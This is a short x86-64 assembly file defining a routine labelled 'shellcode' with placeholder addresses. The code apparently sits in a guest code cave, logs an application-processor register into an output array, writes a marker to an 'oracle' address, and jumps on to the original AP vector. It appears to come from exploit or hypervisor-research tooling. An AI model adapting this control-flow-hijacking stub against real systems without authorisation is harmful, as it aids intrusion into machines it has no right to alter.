.intel_syntax noprefix
.text
.global shellcode
.type shellcode, @function

// Record the incoming AP RDI in one of 16 guest-cave slots (indexed by its
// low nibble), then mark completion and jump to the stock AP vector.
shellcode:
    lea     rsp, [rip + 0xef9]
    mov     rdx, rdi
    and     edx, 15
    movabs  rax, 0x1111111111111111   // output array VA
    mov     qword ptr [rax + rdx * 8], rdi
    movabs  rdx, 0x1270a9e17e5e0002  // AP marker
    movabs  rax, 0x2222222222222222   // oracle VA
    mov     qword ptr [rax], rdx
    movabs  rcx, 0x3333333333333333   // stock AP vector
    jmp     rcx
.size shellcode, .-shellcode
